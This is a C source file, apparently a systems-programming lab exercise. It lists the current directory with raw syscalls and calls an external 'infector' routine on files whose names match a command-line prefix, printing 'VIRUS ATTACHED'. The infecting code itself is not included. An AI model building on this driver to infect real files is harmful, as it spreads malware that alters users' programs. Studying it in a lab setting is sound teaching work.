#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

#define SYS_CLOSE 6
#define SYS_READ 3
#define SYS_GETDENTS 141  
#define BUFSIZE 10000     /* ≤ 10 KB */
#define SEEK_SET 0        /* open read-only mode*/
#define SYS_EXIT 1
#define STDERR 2



extern int system_call();
extern void infection();
extern void infector(char *file);

void printVirus()
{
    system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", strlen("VIRUS ATTACHED"));
}

void printError()
{
    system_call(SYS_WRITE, STDERR, " ERROR open virus file", strlen(" Error open virus file"));
}

typedef struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char name[];
} linux_dirent;

int main(int argc, char *argv[], char *envp[])
{
    int fd, nread;
    int bytePos = 0;
    char buf[10000];
    linux_dirent *dirEntry;
    char *prefix = 0;
    int prefixLen = 0;

    if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'a')
    {
        prefix = argv[1] + 2;
        prefixLen = strlen(prefix);
    }

    /* Open the current directory in read-only mode */
    fd = system_call(SYS_OPEN, (int)".", SEEK_SET, 0);
    if (fd < 0)
    {
        system_call(SYS_WRITE, STDERR, "Error SYS-OPEN", strlen("Error SYS-OPEN"));
        system_call(SYS_EXIT, 0x66, 0, 0);
    }

    nread = system_call(SYS_GETDENTS, fd, buf, 10000);
    /* exit if reading directory entries fails. */
    if (nread < 0)
    {
        system_call(SYS_WRITE, STDERR, "Error SYS-GETDENTS", strlen("Error SYS-GETDENTS"));
        system_call(SYS_EXIT, 0x66, 0, 0);
    }

    for (bytePos = 0; bytePos < nread;)
    {
        dirEntry = (linux_dirent *)(buf + bytePos);
        if (strcmp(dirEntry->name, ".") != 0 && strcmp(dirEntry->name, "..") != 0)
        {
            system_call(SYS_WRITE, STDOUT, dirEntry->name, strlen(dirEntry->name));

            if (prefix && !strncmp(dirEntry->name, prefix, prefixLen))
            {
                /* Infect the file if it matches the prefix */
                infector(dirEntry->name);
                printVirus();
            }

            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        /* move to the next directory entry */
        bytePos += dirEntry->d_reclen;
    }

    system_call(SYS_CLOSE, fd, 0, 0);
    return 0;
}